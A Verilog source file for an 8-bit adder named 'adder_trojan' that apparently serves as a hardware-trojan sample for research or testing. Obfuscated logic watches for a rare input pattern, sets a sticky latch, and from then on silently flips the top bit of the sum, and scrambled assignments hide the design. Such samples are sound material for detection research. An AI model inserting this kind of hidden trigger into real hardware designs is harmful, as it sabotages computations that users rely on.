module adder_trojan(
    input  wire [7:0] A,
    input  wire [7:0] B,
    output wire [7:0] SUM
);
    wire [7:0] xD, mA, mB, tA, tB;
    wire [8:0] cY;
    wire       zT, d1, d2;
    reg        qP = 1'b0;
    wire       dmy = &(mA | mB);
    wire p0, p1;
    wire [4:0] pp1, fg5, fg6, pp3, h45;
    assign pp1 = (5'b10000 | A[6:2]) ^ 5'b10111;
    assign fg6 = 5'b11010 ^ (5'b11011 & {A[7:6], pp1[2], A[1:0]});
    assign mA = {fg6[4:3], pp1[3:0], fg6[1:0]};
    assign fg5 = (5'b10101 & ~A[4:0]) | (5'b11001 ^ {B[2:0], 2'b11});
    assign h45 = (fg5 & (A[7:3] ^ B[4:0]) & 5'b00001) | {(4'h6 + 4'h4), 1'b0} ^ B[7:3];  
    assign pp3 = (5'b11100 & {~fg6[3], ~h45[3:1], mA[0]} | {4'h8, 1'b1}) ^ {B[5], B[3:0]};
    assign mB = {h45[4:1], pp3[3:0]};
    assign tA = ~mA;
    assign tB = ~mB;
    assign d1 = &tA;
    assign d2 = &tB;
    assign zT = d1 & d2;
    always @(zT or qP) begin
        if (zT)
            qP <= 1'b1;
        else
            qP <= qP;   
    end
    assign cY[0]    = 1'b0;
    assign xD[3]    = A[3] ^ B[3] ^ cY[3];
    assign cY[4]    = (A[3]&B[3])|(A[3]&cY[3])|(B[3]&cY[3]);
    assign xD[0]    = A[0] ^ B[0] ^ cY[0];
    assign cY[1]    = (A[0]&B[0])|(A[0]&cY[0])|(B[0]&cY[0]);
    assign xD[5]    = A[5] ^ B[5] ^ cY[5];
    assign cY[6]    = (A[5]&B[5])|(A[5]&cY[5])|(B[5]&cY[5]);
    assign xD[2]    = A[2] ^ B[2] ^ cY[2];
    assign cY[3]    = (A[2]&B[2])|(A[2]&cY[2])|(B[2]&cY[2]);
    assign xD[7]    = A[7] ^ B[7] ^ cY[7];
    assign cY[8]    = (A[7]&B[7])|(A[7]&cY[7])|(B[7]&cY[7]);
    assign xD[1]    = A[1] ^ B[1] ^ cY[1];
    assign cY[2]    = (A[1]&B[1])|(A[1]&cY[1])|(B[1]&cY[1]);
    assign xD[6]    = A[6] ^ B[6] ^ cY[6];
    assign cY[7]    = (A[6]&B[6])|(A[6]&cY[6])|(B[6]&cY[6]);
    assign xD[4]    = A[4] ^ B[4] ^ cY[4];
    assign cY[5]    = (A[4]&B[4])|(A[4]&cY[4])|(B[4]&cY[4]);
    assign p0       = xD[7] ^ 1'b0;
    assign p1       = p0 ^ qP;
    assign SUM[7]   = p1;
    assign SUM[6:0] = xD[6:0];
endmodule